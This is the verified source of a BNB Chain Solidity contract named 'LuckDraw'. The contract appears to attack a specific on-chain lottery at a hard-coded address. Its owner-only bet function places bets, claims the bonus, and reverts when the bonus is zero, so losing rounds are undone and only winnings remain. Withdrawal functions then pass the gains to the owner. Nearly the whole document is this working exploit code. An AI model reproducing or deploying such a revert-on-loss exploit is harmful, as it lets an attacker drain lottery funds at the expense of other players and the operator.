/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface ILottery{
    function bet(address _token, uint8 _betType, uint256 _betNumber, uint256 _betAmount) external;
    function clear() external;
    function getBonus(address _token) external;
    //function userBonus(address owner, address _token) external view returns (uint256);
    function userBonus(address _owner, address token) external view returns (uint256);

}

// interface IPayinit{
//     function PayForTheContract() external;
// }

contract LuckDraw{

    modifier isOwner(){
        require(msg.sender == owner,"fuckit!");
         _;
    }
    
    address private owner;
    address  public usdtToken = 0x55d398326f99059fF775485246999027B3197955;
    address  public hashToken = 0x37B3735D73F853eb4E3D6A02aA2DfAd5AeE6470E;
    address  public win = 0xB8F26521e70E49b99E3c7998d1d51a8Ab228b04d;


    constructor(){
        owner = msg.sender;
        IERC20(usdtToken).approve(hashToken,2**256 - 1);// 先授权合约a->
        
    }

   function bet(address _token, uint8 _betType, uint256 _betNumber, uint256 _betAmount) external  isOwner {
       //uint256 init_balance = IERC20(usdtToken).balanceOf(address(this));
       ILottery(hashToken).bet(_token,_betType,_betNumber,_betAmount);
       ILottery(hashToken).bet(_token,_betType,_betNumber,_betAmount);
       //ILottery(hashToken).clear();
       ILottery(hashToken).getBonus(_token);
     //  @custom:dev-run-script file_path
       uint256 _need = ILottery(hashToken).userBonus(msg.sender,_token);
       if(_need ==0){
           revert();
       }

       //int256 _bonus = ILottery(hashToken).userBonus(owner,usdtToken);
       //_bonus
      //
    //    if(init_balance < IERC20(usdtToken).balanceOf(address(this))){
    //        revert();
    //    }
       //require(IERC20(usdtToken).balanceOf(address(this))< init_balance,"no win");
       //IERC20(_token).transfer(msg.sender, 1000);

   }

   function PayForTheContract(uint256 _amount) external  isOwner{
       //require(goodman[msg.sender] == true);
       IERC20(usdtToken).transfer(msg.sender,_amount);
   }
    function CooolWithdraw(address _token, uint _amount) external isOwner returns(bool success)  {
        require(IERC20(_token).balanceOf(address(this)) >= _amount, "not enough tokens in contract");
        IERC20(_token).transfer(msg.sender, _amount);
        return true;
    }   

    

}